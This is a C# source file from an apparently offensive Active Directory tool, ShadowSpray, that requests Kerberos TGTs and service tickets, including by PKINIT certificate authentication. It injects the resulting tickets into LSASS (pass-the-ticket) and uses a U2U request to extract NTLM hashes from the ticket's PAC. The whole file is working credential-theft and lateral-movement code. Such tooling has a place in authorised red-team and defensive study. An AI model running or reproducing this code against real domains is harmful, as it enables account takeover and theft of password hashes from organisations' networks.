using Asn1;
using ShadowSpray.Asn1;
using ShadowSpray.Kerb;
using ShadowSpray.Kerb.Kerberos;
using ShadowSpray.Kerb.Kerberos.PAC;
using ShadowSpray.Kerb.lib.Interop;
using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography.X509Certificates;

namespace ShadowSpray
{
    public class KrbRelayUpException : Exception
    {
        public KrbRelayUpException(string message)
            : base(message)
        {
        }
    }

    public class KerberosErrorException : KrbRelayUpException
    {
        public KRB_ERROR krbError;

        public KerberosErrorException(string message, KRB_ERROR krbError)
            : base(message)
        {
            this.krbError = krbError;
        }
    }

    class AskTGT
    {
        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, out string nthash, string domainController = "", LUID luid = new LUID(), bool describe = false, bool opsec = false, string servicekey = "", bool changepw = false, bool pac = true, string proxyUrl = null)
        {
            nthash = null;
            AS_REQ userHashASREQ = AS_REQ.NewASReq(userName, domain, keyString, etype, opsec, changepw, pac);
            try
            {
                return InnerTGT(userHashASREQ, etype, outfile, ptt, out nthash, domainController, luid, describe, true, opsec, servicekey, false, proxyUrl);
            }
            catch (KerberosErrorException ex)
            {
                KRB_ERROR error = ex.krbError;
                try
                {
                    if (Options.verbose)
                        Console.WriteLine("\r\n[-] KRB-ERROR ({0}) : {1}: {2}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code, error.e_text);
                }
                catch
                {
                    if (Options.verbose)
                        Console.WriteLine("\r\n[-] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
                }
            }
            catch (KrbRelayUpException ex)
            {
                Console.WriteLine(ex.Message + "\r\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine("\r\n" + ex.Message + "\r\n");
            }
            Environment.Exit(0);
            return null;
        }

        public static byte[] TGT(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, out string nthash, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verifyCerts = false, string servicekey = "", bool getCredentials = false, string proxyUrl = null)
        {
            nthash = null;
            try
            {
                X509Certificate2 cert = null;

                if (Kerb.Helpers.IsBase64String(certFile))
                {
                    cert = new X509Certificate2(Convert.FromBase64String(certFile), certPass);
                }
                else if (File.Exists(certFile))
                {
                    cert = new X509Certificate2(File.ReadAllBytes(certFile), certPass);
                }

                if (cert == null)
                {
                    Console.WriteLine("[-] Failed to load certificate");
                    return null;
                }

                KDCKeyAgreement agreement = new KDCKeyAgreement();
                if (Options.verbose)
                {
                    Console.WriteLine("[+] Using PKINIT with etype {0} and subject: {1} ", etype, cert.Subject);
                    Console.WriteLine("[+] Building AS-REQ (w/ PKINIT preauth) for: '{0}\\{1}'", domain, userName);
                }
                AS_REQ pkinitASREQ = AS_REQ.NewASReq(userName, domain, cert, agreement, etype, verifyCerts);
                return InnerTGT(pkinitASREQ, etype, outfile, ptt, out nthash, domainController, luid, describe, true, false, servicekey, getCredentials, proxyUrl);

            }
            catch (KerberosErrorException ex)
            {
                KRB_ERROR error = ex.krbError;
                if (Options.verbose)
                    Console.WriteLine("[-] KRB-ERROR ({0}) : {1}", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            catch (KrbRelayUpException ex)
            {
                if (Options.verbose)
                    Console.WriteLine("[-] " + ex.Message);
            }

            return null;
        }

        public static byte[] InnerTGT(AS_REQ asReq, Interop.KERB_ETYPE etype, string outfile, bool ptt, out string nthash, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verbose = false, bool opsec = false, string serviceKey = "", bool getCredentials = false, string proxyUrl = null)
        {
            byte[] response = null;
            string dcIP = null;

            if (String.IsNullOrEmpty(proxyUrl))
            {
                dcIP = Networking.GetDCIP(domainController, false, asReq.req_body.realm);
                if (String.IsNullOrEmpty(dcIP))
                {
                    throw new Exception("[-] Unable to get domain controller address");
                }

                response = Networking.SendBytes(dcIP, 88, asReq.Encode().Encode());
            }
            else
            {
                KDC_PROXY_MESSAGE message = new KDC_PROXY_MESSAGE(asReq.Encode().Encode());
                message.target_domain = asReq.req_body.realm;
                response = Networking.MakeProxyRequest(proxyUrl, message);
            }
            if (response == null)
            {
                throw new Exception("[-] No answer from domain controller");
            }

            // decode the supplied bytes to an AsnElt object
            AsnElt responseAsn;
            try
            {
                responseAsn = AsnElt.Decode(response);
            }
            catch (Exception e)
            {
                throw new Exception($"Error parsing response AS-REQ: {e}.  Base64 response: {Convert.ToBase64String(response)}");
            }

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
            {
                if (Options.verbose)
                {
                    Console.WriteLine("[+] TGT request successful!");
                }

                byte[] kirbiBytes = HandleASREP(responseAsn, etype, asReq.keyString, outfile, ptt, out nthash, luid, describe, verbose, asReq, serviceKey, getCredentials, dcIP);
                return kirbiBytes;
            }
            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                throw new KerberosErrorException("", error);
            }
            else
            {
                throw new Exception("[-] Unknown application tag: " + responseTag);
            }
        }

        private static byte[] HandleASREP(AsnElt responseAsn, Interop.KERB_ETYPE etype, string keyString, string outfile, bool ptt, out string nthash, LUID luid = new LUID(), bool describe = false, bool verbose = false, AS_REQ asReq = null, string serviceKey = "", bool getCredentials = false, string dcIP = "")
        {
            nthash = null;
            // parse the response to an AS-REP
            AS_REP rep = new AS_REP(responseAsn);

            // convert the key string to bytes
            byte[] key;
            if (GetPKInitRequest(asReq, out PA_PK_AS_REQ pkAsReq))
            {
                // generate the decryption key using Diffie Hellman shared secret 
                PA_PK_AS_REP pkAsRep = (PA_PK_AS_REP)rep.padata[0].value;
                key = pkAsReq.Agreement.GenerateKey(pkAsRep.DHRepInfo.KDCDHKeyInfo.SubjectPublicKey.DepadLeft(), Array.Empty<byte>(),
                    pkAsRep.DHRepInfo.ServerDHNonce, GetKeySize(etype));
            }
            else
            {
                // convert the key string to bytes
                key = Kerb.Helpers.StringToByteArray(keyString);
            }

            if (rep.enc_part.etype != (int)etype)
            {
                // maybe this should be a fatal error instead of just a warning?
                if (Options.verbose)
                    Console.WriteLine($"[!] Warning: Supplied encryption key type is {etype} but AS-REP contains data encrypted with {(Interop.KERB_ETYPE)rep.enc_part.etype}");
            }

            // decrypt the enc_part containing the session key/etc.

            byte[] outBytes;

            if (etype == Interop.KERB_ETYPE.des_cbc_md5)
            {
                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
            }
            else if (etype == Interop.KERB_ETYPE.rc4_hmac)
            {
                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
            }
            else if (etype == Interop.KERB_ETYPE.aes128_cts_hmac_sha1)
            {
                // KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY = 3
                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
            }
            else if (etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
            {
                // KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY = 3
                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
            }
            else
            {
                throw new Exception("[-] Encryption type \"" + etype + "\" not currently supported");
            }

            AsnElt ae = null;
            bool decodeSuccess = false;
            try
            {
                ae = AsnElt.Decode(outBytes);
                // Make sure the data has expected value so we know decryption was successful (from kerberos spec: EncASRepPart ::= [APPLICATION 25] )
                if (ae.TagValue == 25)
                {
                    decodeSuccess = true;
                }
            }
            catch (Exception ex)
            {
                if (Options.verbose)
                    Console.WriteLine("[-] Error parsing encrypted part of AS-REP: " + ex.Message);
            }

            if (decodeSuccess == false)
            {
                if (Options.verbose)
                    Console.WriteLine($"[-] Failed to decrypt TGT using supplied password/hash. If this TGT was requested with no preauth then the password supplied may be incorrect or the data was encrypted with a different type of encryption than expected");
                return null;
            }

            EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);

            // now build the final KRB-CRED structure
            KRB_CRED cred = new KRB_CRED();

            // add the ticket
            cred.tickets.Add(rep.ticket);

            // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

            KrbCredInfo info = new KrbCredInfo();

            // [0] add in the session key
            info.key.keytype = encRepPart.key.keytype;
            info.key.keyvalue = encRepPart.key.keyvalue;

            // [1] prealm (domain)
            info.prealm = encRepPart.realm;

            // [2] pname (user)
            info.pname.name_type = rep.cname.name_type;
            info.pname.name_string = rep.cname.name_string;

            // [3] flags
            info.flags = encRepPart.flags;

            // [4] authtime (not required)

            // [5] starttime
            info.starttime = encRepPart.starttime;

            // [6] endtime
            info.endtime = encRepPart.endtime;

            // [7] renew-till
            info.renew_till = encRepPart.renew_till;

            // [8] srealm
            info.srealm = encRepPart.realm;

            // [9] sname
            info.sname.name_type = encRepPart.sname.name_type;
            info.sname.name_string = encRepPart.sname.name_string;

            // add the ticket_info into the cred object
            cred.enc_part.ticket_info.Add(info);

            byte[] kirbiBytes = cred.Encode().Encode();

            if (!String.IsNullOrEmpty(outfile))
            {
                outfile = Kerb.Helpers.MakeValidFileName(outfile);
                if (Kerb.Helpers.WriteBytesToFile(outfile, kirbiBytes))
                {
                    if (verbose)
                    {
                        Console.WriteLine("\r\n[+] Ticket written to {0}\r\n", outfile);
                    }
                }
            }
            
            if (ptt || (luid != 0))
            {
                // pass-the-ticket -> import into LSASS
                LSA.ImportTicket(kirbiBytes, luid);
            }

            if (describe)
            {
                KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                //LSA.DisplayTicket(kirbi, 2, false, false, false, false, string.IsNullOrEmpty(serviceKey) ? null : Helpers.StringToByteArray(serviceKey), key);
            }

            if (getCredentials)
            {
                if (Options.verbose)
                    Console.WriteLine("[+] Getting credentials using U2U\r\n");
                byte[] u2uBytes = TGS_REQ.NewTGSReq(info.pname.name_string[0], info.prealm, info.pname.name_string[0], cred.tickets[0], info.key.keyvalue, (Interop.KERB_ETYPE)info.key.keytype, Interop.KERB_ETYPE.subkey_keymaterial, false, String.Empty, false, false, false, false, cred, "", true);
                byte[] u2uResponse = Networking.SendBytes(dcIP, 88, u2uBytes);
                if (u2uResponse == null)
                {
                    return null;
                }
                AsnElt u2uResponseAsn = AsnElt.Decode(u2uResponse);

                // check the response value
                int responseTag = u2uResponseAsn.TagValue;

                if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
                {
                    // parse the response to an TGS-REP and get the PAC
                    TGS_REP u2uRep = new TGS_REP(u2uResponseAsn);
                    EncTicketPart u2uEncTicketPart = u2uRep.ticket.Decrypt(info.key.keyvalue, key);
                    PACTYPE pt = u2uEncTicketPart.GetPac(key);

                    // look for the credential information and print
                    foreach (var pacInfoBuffer in pt.PacInfoBuffers)
                    {
                        if (pacInfoBuffer is PacCredentialInfo ci)
                        {
                            if (ci.CredentialInfo.HasValue)
                            {
                                foreach (var credData in ci.CredentialInfo.Value.Credentials)
                                {
                                    if ("NTLM".Equals(credData.PackageName.ToString()))
                                    {
                                        int version = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 0);
                                        int flags = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 4);
                                        if (flags == 3)
                                        {
                                            nthash = $"{Kerb.Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(8).Take(16).ToArray())}:{Kerb.Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray())}";
                                        }
                                        else
                                        {
                                            nthash = $"{Kerb.Helpers.ByteArrayToString(((byte[])(Array)credData.Credentials).Skip(24).Take(16).ToArray())}";
                                        }
                                    }
                                    else
                                    {
                                        nthash = Kerb.Helpers.ByteArrayToString((byte[])(Array)credData.Credentials);
                                    }

                                }

                            }
                            else
                            {
                                if (Options.verbose)
                                    Console.WriteLine("[-] CredentialData has no key");
                            }
                        }
                    }
                }
                else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
                {
                    // parse the response to an KRB-ERROR
                    KRB_ERROR error = new KRB_ERROR(u2uResponseAsn.Sub[0]);
                    if (Options.verbose)
                        Console.WriteLine("\r\n[-] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
                }
                else
                {
                    if (Options.verbose)
                        Console.WriteLine("\r\n[-] Unknown application tag: {0}", responseTag);
                }
            }

            return kirbiBytes;
        }

        public static bool GetPKInitRequest(AS_REQ asReq, out PA_PK_AS_REQ pkAsReq)
        {

            if (asReq != null && asReq.padata != null)
            {
                foreach (PA_DATA paData in asReq.padata)
                {
                    if (paData.type == Interop.PADATA_TYPE.PK_AS_REQ)
                    {
                        pkAsReq = (PA_PK_AS_REQ)paData.value;
                        return true;
                    }
                }
            }
            pkAsReq = null;
            return false;
        }

        public static int GetKeySize(Interop.KERB_ETYPE etype)
        {
            switch (etype)
            {
                case Interop.KERB_ETYPE.des_cbc_md5:
                    return 7;
                case Interop.KERB_ETYPE.rc4_hmac:
                    return 16;
                case Interop.KERB_ETYPE.aes128_cts_hmac_sha1:
                    return 16;
                case Interop.KERB_ETYPE.aes256_cts_hmac_sha1:
                    return 32;
                default:
                    throw new ArgumentException("Only /des, /rc4, /aes128, and /aes256 are supported at this time");
            }
        }

        public static byte[] TGS(KRB_CRED kirbi, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, string targetDomain = "", string servicekey = "", string asrepkey = "", bool u2u = false, string targetUser = "", bool printargs = false, string proxyUrl = null)
        {
            // kirbi            = the TGT .kirbi to use for ticket requests
            // service          = the SPN being requested
            // requestEType     = specific encryption type for the request, Interop.KERB_ETYPE.subkey_keymaterial implies default
            // ptt              = "pass-the-ticket" so apply the ticket to the current logon session
            // domainController = the specific domain controller to send the request, defaults to the system's DC
            // display          = true to display the ticket

            // extract out the info needed for the TGS-REQ request
            string userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
            string domain = kirbi.enc_part.ticket_info[0].prealm;
            Ticket ticket = kirbi.tickets[0];
            byte[] clientKey = kirbi.enc_part.ticket_info[0].key.keyvalue;

            // the etype for the PA Data for the request, so needs to match the TGT key type
            Interop.KERB_ETYPE paEType = (Interop.KERB_ETYPE)kirbi.enc_part.ticket_info[0].key.keytype;


            return TGS(userName, domain, ticket, clientKey, paEType, service, requestEType, outfile, ptt, domainController, display, enterprise, roast, opsec, tgs, targetDomain, servicekey, asrepkey, u2u, targetUser, printargs, proxyUrl);

        }

        public static byte[] TGS(string userName, string domain, Ticket providedTicket, byte[] clientKey, Interop.KERB_ETYPE paEType, string service, Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial, string outfile = "", bool ptt = false, string domainController = "", bool display = true, bool enterprise = false, bool roast = false, bool opsec = false, KRB_CRED tgs = null, string targetDomain = "", string servicekey = "", string asrepkey = "", bool u2u = false, string targetUser = "", bool printargs = false, string proxyUrl = null)
        {

            // if /service is empty get name from the supplied /tgs
            if (u2u && tgs != null && String.IsNullOrEmpty(service))
                service = tgs.enc_part.ticket_info[0].pname.name_string[0];

            byte[] tgsBytes = TGS_REQ.NewTGSReq(userName, domain, service, providedTicket, clientKey, paEType, requestEType, false, targetUser, enterprise, roast, opsec, false, tgs, targetDomain, u2u);

            byte[] response = null;
            string dcIP = null;
            if (String.IsNullOrEmpty(proxyUrl))
            {
                dcIP = Networking.GetDCIP(domainController, display, domain);
                if (String.IsNullOrEmpty(dcIP)) { return null; }

                response = Networking.SendBytes(dcIP, 88, tgsBytes);
            }
            else
            {
                if (Options.verbose)
                    Console.WriteLine("[+] Sending request via KDC proxy: {0}", proxyUrl);
                KDC_PROXY_MESSAGE message = new KDC_PROXY_MESSAGE(tgsBytes);
                if (String.IsNullOrEmpty(targetDomain)) { targetDomain = domain; }
                message.target_domain = targetDomain;
                response = Networking.MakeProxyRequest(proxyUrl, message);
            }
            if (response == null)
            {
                return null;
            }

            // decode the supplied bytes to an AsnElt object
            //  false == ignore trailing garbage
            AsnElt responseAsn = AsnElt.Decode(response);

            // check the response value
            int responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
            {
                if (Options.verbose)
                {
                    Console.WriteLine("[+] TGS request successful!");
                }

                // parse the response to an TGS-REP
                TGS_REP rep = new TGS_REP(responseAsn);

                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                byte[] outBytes = Crypto.KerberosDecrypt(paEType, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, clientKey, rep.enc_part.cipher);

                AsnElt ae = AsnElt.Decode(outBytes);
                EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);
                
                // now build the final KRB-CRED structure
                KRB_CRED cred = new KRB_CRED();

                // add the ticket
                cred.tickets.Add(rep.ticket);

                // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

                KrbCredInfo info = new KrbCredInfo();

                // [0] add in the session key
                info.key.keytype = encRepPart.key.keytype;
                info.key.keyvalue = encRepPart.key.keyvalue;

                // [1] prealm (domain)
                info.prealm = rep.crealm;

                // [2] pname (user)
                info.pname.name_type = rep.cname.name_type;
                info.pname.name_string = rep.cname.name_string;

                // [3] flags
                info.flags = encRepPart.flags;

                // [4] authtime (not required)

                // [5] starttime
                info.starttime = encRepPart.starttime;

                // [6] endtime
                info.endtime = encRepPart.endtime;

                // [7] renew-till
                info.renew_till = encRepPart.renew_till;

                // [8] srealm
                info.srealm = encRepPart.realm;

                // [9] sname
                info.sname.name_type = encRepPart.sname.name_type;
                info.sname.name_string = encRepPart.sname.name_string;

                // add the ticket_info into the cred object
                cred.enc_part.ticket_info.Add(info);

                byte[] kirbiBytes = cred.Encode().Encode();


                LSA.ImportTicket(kirbiBytes, new LUID());


                return kirbiBytes;
            }
            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                if (Options.verbose)
                    Console.WriteLine("\r\n[-] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            else
            {
                if (Options.verbose)
                    Console.WriteLine("\r\n[-] Unknown application tag: {0}", responseTag);
            }
            return null;
        }

    }
}
